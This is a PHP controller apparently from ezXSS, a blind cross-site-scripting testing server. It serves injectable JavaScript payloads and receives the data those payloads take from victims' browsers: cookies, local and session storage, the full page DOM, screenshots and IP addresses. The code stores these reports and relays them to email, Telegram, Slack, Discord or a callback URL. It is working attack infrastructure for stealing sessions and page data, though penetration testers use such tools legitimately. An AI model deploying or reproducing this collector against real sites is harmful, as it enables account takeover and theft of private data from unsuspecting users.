<?php

class Payloads extends Controller
{
    /**
     * Summary of rows
     * 
     * @var array
     */
    private $rows = ['uri', 'ip', 'referer', 'user-agent', 'cookies', 'localstorage', 'sessionstorage', 'dom', 'origin'];

    /**
     * Add default headers to constructor
     */
    public function __construct()
    {
        parent::__construct();
        
        // Add CORS headers
        header('Access-Control-Allow-Origin: *');
        header('Access-Control-Allow-Headers: origin, x-requested-with, content-type');
        header('Access-Control-Allow-Methods: GET, POST');
    }

    /**
     * Renders the default payload and returns the content.
     *
     * @return string
     */
    public function index()
    {
        $this->view->renderPayload('index');
        $this->view->setContentType('application/x-javascript');

        // Get the payload data for the current URL
        $payload = $this->getPayloadByUrl(url);

        // Create the string of rows we dont collect
        $noCollect = [];
        foreach ($this->rows as $row) {
            if ($payload["collect_{$row}"] === 0) {
                $noCollect[] = "'$row'";
            }
        }

        // Create the string of pages we collect
        $pages = array_map(function ($page) {
            return "'" . e($page) . "'";
        }, array_filter(explode('~', $payload['pages'])));

        $screenshot = $payload['collect_screenshot'] ? $this->view->getPayload('screenshot') : '';

        $this->view->renderData('noCollect', implode(',', $noCollect), true);
        $this->view->renderData('pages', implode(',', $pages), true);
        $this->view->renderData('customjs', $payload['customjs'], true);
        $this->view->renderData('globaljs', $this->model('Setting')->get('customjs'), true);
        $this->view->renderData('screenshot', $screenshot, true);
        $this->view->renderData('payload', url);

        return $this->view->getContent();
    }

    /**
     * Renders custom payload and returns the content.
     *
     * @param string $name Payload name
     * @return string
     */
    public function custom($name)
    {
        try {
            $this->view->renderPayload($name);
            $this->view->setContentType('application/x-javascript');
            return $this->view->getContent();
        } catch (Exception $e) {
            // On any type of error, fallback to default
            return $this->index();
        }
    }

    /**
     * Callback function that receives all incoming data
     *
     * @return string
     */
    public function callback()
    {
        // Set the content type to plain text
        $this->view->setContentType('text/plain');

        // Check method
        if (!$this->isPOST()) {
            return 'github.com/ssl/ezXSS';
        }

        // Decode the JSON data
        $data = json_decode(file_get_contents('php://input'), false);

        if(empty($data)) {
            return 'github.com/ssl/ezXSS';
        }

        // Set a default value for the screenshot
        $data->screenshot = $data->screenshot ?? '';

        // Get the user's IP address
        $data->ip = $data->ip ?? $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_REAL_IP'] ?? $_SERVER['REMOTE_ADDR'];

        // Remove the protocol from the origin URL
        $data->origin = str_replace(['https://', 'http://'], '', $data->origin ?? '');

        // Truncate very long strings
        $data->uri = substr($data->uri ?? '', 0, 1000);
        $data->referer = substr($data->referer ?? '', 0, 1000);
        $data->origin = substr($data->origin ?? '', 0, 500);
        $data->payload = substr($data->payload ?? '', 0, 500);
        $data->{'user-agent'} = substr($data->{'user-agent'} ?? '', 0, 500);

        // Check black and whitelist
        $payload = $this->getPayloadByUrl($data->payload);

        $blacklistDomains = explode('~', $payload['blacklist']);
        $whitelistDomains = explode('~', $payload['whitelist']);

        // Check for blacklisted domains
        foreach ($blacklistDomains as $blockedDomain) {
            if ($data->origin == $blockedDomain) {
                return 'github.com/ssl/ezXSS';
            }
            if (strpos($blockedDomain, '*') !== false) {
                $blockedDomain = str_replace('*', '(.*)', $blockedDomain);
                if (preg_match('/^' . $blockedDomain . '$/', $data->origin)) {
                    return 'github.com/ssl/ezXSS';
                }
            }
        }

        // Check for whitelisted domains
        if ($payload['whitelist'] !== '' && $payload['whitelist'] !== null) {
            $foundWhitelist = false;
            foreach ($whitelistDomains as $whitelistDomain) {
                if ($data->origin == $whitelistDomain) {
                    $foundWhitelist = true;
                }
                if (strpos($whitelistDomain, '*') !== false) {
                    $whitelistDomain = str_replace('*', '(.*)', $whitelistDomain);
                    if (preg_match('/^' . $whitelistDomain . '$/', $data->origin)) {
                        $foundWhitelist = true;
                    }
                }
            }
            if (!$foundWhitelist) {
                return '1github.com/ssl/ezXSS';
            }
        }

        // Check if the report should be saved or alerted
        $doubleReport = false;
        if ($this->model('Setting')->get('filter-save') == 0 || $this->model('Setting')->get('filter-alert') == 0) {
            if ($this->model('Report')->searchForDublicates($data->cookies ?? '', $data->dom ?? '', $data->origin, $data->referer, $data->uri, $data->{'user-agent'}, $data->ip)) {
                if ($this->model('Setting')->get('filter-save') == 0 && $this->model('Setting')->get('filter-alert') == 0) {
                    return 'github.com/ssl/ezXSS';
                } else {
                    $doubleReport = true;
                }
            }
        }

        if (($doubleReport && ($this->model('Setting')->get('filter-save') == 1 || $this->model('Setting')->get('filter-alert') == 1)) || (!$doubleReport)) {

            // Create a image from the screenshot data
            if (!empty($data->screenshot)) {
                try {
                    $screenshot = base64_decode(preg_replace('#^data:image/\w+;base64,#i', '', $data->screenshot));
                    $data->screenshotName = time() . md5(
                        $data->uri . time() . bin2hex(openssl_random_pseudo_bytes(16))
                    ) . bin2hex(openssl_random_pseudo_bytes(5));
                    $saveImage = fopen(__DIR__ . "/../../assets/img/report-{$data->screenshotName}.png", 'w');
                    fwrite($saveImage, $screenshot);
                    fclose($saveImage);
                } catch (Exception $e) {
                    $data->screenshotName = '';
                }
            }

            // Save the report
            $shareId = sha1(bin2hex(openssl_random_pseudo_bytes(32)) . time());
            $data->id = $this->model('Report')->add(
                $shareId,
                $data->cookies ?? '',
                $data->dom ?? '',
                $data->origin,
                $data->referer,
                $data->uri,
                $data->{'user-agent'},
                $data->ip,
                ($data->screenshotName ?? ''),
                json_encode($data->localstorage ?? ''),
                json_encode($data->sessionstorage ?? ''),
                $data->payload
            );
            $data->domain = host;
            $data->time = time();
            $data->timestamp = date("c", strtotime("now"));

            // Send out alerts
            if (($doubleReport && $this->model('Setting')->get('filter-alert') == 1) || (!$doubleReport)) {
                try {
                    $this->alert($data);
                } catch (Exception $e) {
                }
            }
        }

        return 'github.com/ssl/ezXSS';
    }

    /**
     * Send an alert message
     *
     * @param object $data The data to be displayed in the alert message
     * @return void
     */
    private function alert($data)
    {
        // Callback alerting
        if ($this->model('Setting')->get('alert-callback') == 1) {
            $this->callbackAlert($data);
        }

        // Check if the DOM should be truncated
        if ($this->model('Setting')->get('dompart') > 0 && strlen($data->dom ?? '') > $this->model('Setting')->get('dompart')) {
            $data->dom = substr($data->dom ?? '', 0, $this->model('Setting')->get('dompart')) .
                '&#13;&#10;&#13;&#10;View full dom on the report page or change this setting on /settings';
        }

        $payload = $this->getPayloadByUrl($data->payload);

        // Email alerting
        if ($this->model('Setting')->get('alert-mail') == 1) {
            // Get all enabled alerts with this method of alerting
            $alerts = $this->model('Alert')->getAllByMethodId(1);

            foreach ($alerts as $alert) {
                if ($alert['user_id'] === 0) {
                    // Global alerting that allways sends if enabled
                    $this->mailAlert($data, $alert['value1']);
                } elseif ($payload['user_id'] !== 0 && $alert['user_id'] === $payload['user_id']) {
                    // Sends alert to user that owns the payload
                    $this->mailAlert($data, $alert['value1']);
                }
            }
        }

        // Telegram alerting
        if ($this->model('Setting')->get('alert-telegram') == 1) {
            // Get all enabled alerts with this method of alerting
            $alerts = $this->model('Alert')->getAllByMethodId(2);

            foreach ($alerts as $alert) {
                if ($alert['user_id'] === 0) {
                    // Global alerting that allways sends if enabled
                    $this->telegramAlert($data, $alert['value1'], $alert['value2']);
                } elseif ($payload['user_id'] !== 0 && $alert['user_id'] === $payload['user_id']) {
                    // Sends alert to user that owns the payload
                    $this->telegramAlert($data, $alert['value1'], $alert['value2']);
                }
            }
        }

        // Slack alerting
        if ($this->model('Setting')->get('alert-slack') == 1) {
            // Get all enabled alerts with this method of alerting
            $alerts = $this->model('Alert')->getAllByMethodId(3);

            foreach ($alerts as $alert) {
                if ($alert['user_id'] === 0) {
                    // Global alerting that allways sends if enabled
                    $this->slackAlert($data, $alert['value1']);
                } elseif ($payload['user_id'] !== 0 && $alert['user_id'] === $payload['user_id']) {
                    // Sends alert to user that owns the payload
                    $this->slackAlert($data, $alert['value1']);
                }
            }
        }

        // Discord alerting
        if ($this->model('Setting')->get('alert-discord') == 1) {
            // Get all enabled alerts with this method of alerting
            $alerts = $this->model('Alert')->getAllByMethodId(4);

            foreach ($alerts as $alert) {
                if ($alert['user_id'] === 0) {
                    // Global alerting that allways sends if enabled
                    $this->discordAlert($data, $alert['value1']);
                } elseif ($payload['user_id'] !== 0 && $alert['user_id'] === $payload['user_id']) {
                    // Sends alert to user that owns the payload
                    $this->discordAlert($data, $alert['value1']);
                }
            }
        }
    }

    /**
     * Sends out alert to custom callback url
     * 
     * @param object $data The data to be displayed in the alert message
     * @return void
     */
    private function callbackAlert($data)
    {
        // Send alert to custom callback url
        $url = (parse_url($this->model('Setting')->get('callback-url'), PHP_URL_SCHEME) ? '' : 'https://') . $this->model('Setting')->get('callback-url');
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTPS | CURLPROTO_HTTP);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 20);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
        curl_setopt($ch, CURLOPT_POSTFIELDS, file_get_contents('php://input'));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_exec($ch);
    }

    /**
     * Sends out alert to telegram bot
     * 
     * @param object $data The data to be displayed in the alert message
     * @param string $bottoken Telegram bot token
     * @param string $chatid Telegram chat id
     * @return void
     */
    private function telegramAlert($data, $bottoken, $chatid)
    {
        if (!empty($data->screenshot)) {
            $data->screenshot = "https://{$data->domain}/assets/img/report-{$data->screenshotName}.png";
        }

        // Create Telegram alert template
        $alertTemplate = $this->view->getAlert('telegram.md');
        $alertTemplate = $this->view->renderAlertData($alertTemplate, $data);

        // Send alert to telegram bot API
        $ch = curl_init("https://api.telegram.org/bot{$bottoken}/sendMessage");
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(['chat_id' => $chatid, 'parse_mode' => 'markdown', 'disable_web_page_preview' => false, 'text' => $alertTemplate]));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_exec($ch);
    }

    /**
     * Sends out alert to mail
     * 
     * @param object $data The data to be displayed in the alert message
     * @param string $email The email to send to
     * @return void
     */
    private function mailAlert($data, $email)
    {
        if (!empty($data->screenshot)) {
            $data->screenshot = "<img style=\"max-width:100%;\" src=\"https://{$data->domain}/assets/img/report-{$data->screenshotName}.png\">";
        }

        // Create mail alert template
        $alertTemplate = $this->view->getAlert('mail.html');
        $alertTemplate = $this->view->renderAlertData($alertTemplate, $data);

        $headers[] = 'From: ezXSS';
        $headers[] = 'MIME-Version: 1.0';
        $headers[] = 'Content-type: text/html; charset=iso-8859-1';
        mail(
            $email,
            '[ezXSS] XSS on ' . e($data->uri),
            $alertTemplate,
            implode("\r\n", $headers)
        );
    }

    /**
     * Sends out alert to Slack
     * 
     * @param object $data The data to be displayed in the alert message
     * @param string $webhookURL The webook url
     * @return void
     */
    private function slackAlert($data, $webhookURL)
    {
        // Create Slack alert template
        $alertTemplate = $this->view->getAlert('slack.md');
        $alertTemplate = $this->view->renderAlertData($alertTemplate, $data);

        // Send alert to Slack webhook
        $ch = curl_init($webhookURL);
        curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTPS);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(['type' => 'mrkdwn', 'text' => $alertTemplate]));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_exec($ch);
    }

    /**
     * Sends out alert to Discord
     * 
     * @param object $data The data to be displayed in the alert message
     * @param string $webhookURL The webook url
     * @return void
     */
    private function discordAlert($data, $webhookURL)
    {
        if (!empty($data->screenshot)) {
            $data->screenshot = "https://{$data->domain}/assets/img/report-{$data->screenshotName}.png";
        }

        // Create Discord alert template
        $alertTemplate = $this->view->getAlert('discord.json');
        $alertTemplate = $this->view->renderAlertData($alertTemplate, $data);
        $discordMessage = json_encode(json_decode($alertTemplate), JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);

        // Send alert to Discord webhook
        $ch = curl_init($webhookURL);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
        curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTPS);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $discordMessage);
        curl_setopt($ch, CURLOPT_HEADER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_exec($ch);
    }

    /**
     * Returns the payload array by url
     * 
     * @param string $payloadUrl The current payload url
     * @return array
     */
    private function getPayloadByUrl($payloadUrl)
    {
        // Split the URL into segments
        $splitUrl = explode('/', $payloadUrl);

        try {
            // Attempt to retrieve the payload by the full path
            $url = (array_key_exists(2, $splitUrl) ? $splitUrl[2] : '' ). '/' . (array_key_exists(3, $splitUrl) ? $splitUrl[3] : '');
            $payload = $this->model('Payload')->getByPayload($url);
        } catch (Exception $e) {
            try {
                // If the payload is not found by the full path, try to retrieve it by the domain name
                $payload = $this->model('Payload')->getByPayload((array_key_exists(2, $splitUrl) ? $splitUrl[2] : '' ));
            } catch (Exception $e) {
                // If the payload is still not found, fallback to the default payload
                $payload = $this->model('Payload')->getById(1);
            }
        }

        return $payload;
    }
}
